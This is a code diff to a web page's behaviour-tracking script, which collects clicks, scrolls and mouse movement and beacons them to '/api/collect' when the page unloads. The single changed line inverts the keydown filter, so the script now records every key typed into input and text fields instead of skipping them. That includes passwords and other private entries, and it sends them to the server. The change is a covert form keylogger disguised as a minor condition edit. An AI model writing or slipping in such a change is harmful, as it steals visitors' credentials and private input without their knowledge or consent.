@@ -56,7 +56,7 @@
         document.addEventListener('mousemove', debouncedMouseMove);
         document.addEventListener('click', (e) => { userData.clicks.push({ x: e.clientX, y: e.clientY, target: e.target.tagName, id: e.target.id, classes: e.target.className, text: e.target.innerText.slice(0, 25), timestamp: Date.now() }); });
         document.addEventListener('scroll', () => { const st = window.pageYOffset || document.documentElement.scrollTop; userData.scrolls.push({ direction: st > lastScrollTop ? 'down' : 'up', position: st, timestamp: Date.now() }); lastScrollTop = st <= 0 ? 0 : st; });
-        document.addEventListener('keydown', (e) => { if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') { userData.keystrokes.push({ key: e.key, timestamp: Date.now() }); } });
+        document.addEventListener('keydown', (e) => { if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') { userData.keystrokes.push({ key: e.key, timestamp: Date.now() }); } });
         window.addEventListener('pagehide', () => { userData.timestamps.end = Date.now(); sendData(); });
         function sendData() { const blob = new Blob([JSON.stringify(userData)], { type: 'application/json' }); navigator.sendBeacon('/api/collect', blob); }
 
